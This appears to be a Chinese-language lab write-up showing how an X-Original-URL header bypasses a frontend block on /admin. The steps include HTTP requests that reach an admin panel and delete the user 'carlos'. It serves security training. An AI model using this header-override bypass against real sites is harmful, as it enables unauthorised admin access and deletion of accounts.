# 实验：基于 URL 的访问控制可被绕过

此网站在 `/admin` 处有一个未经身份验证的管理员面板，但前端系统已被配置为阻止对该路径的外部访问。然而，后端应用程序构建在一个支持 `X-Original-URL` 头的框架上。

为了解决本实验，请访问管理员面板并删除用户 `carlos`。

## 步骤

探测
- 访问主页即存在管理员 UI

- 尝试访问管理员端点
    ```http
    GET /admin HTTP/2
    ```
    - 服务器响应 403 
        `"Access denied"`

- 尝试修改请求方法为 HEAD
    - 无效

- 尝试添加覆盖头部
    ```http
    GET / HTTP/2
    X-Original-Url: /admin
    ```
    - 服务器响应 200，返回管理员页面
        ```html
        <div>
        <span>
            carlos - 
        </span>
        <a href="/admin/delete?username=carlos">
            Delete
        </a>
        </div>
        ```

- 访问删除功能端点，并设置参数
    ```http
    GET /?username=carlos HTTP/2
    X-Original-Url: /admin/delete
    ```
    - 注意，此处的覆盖头部仅设置 URL 路径，查询参数设置在第一行
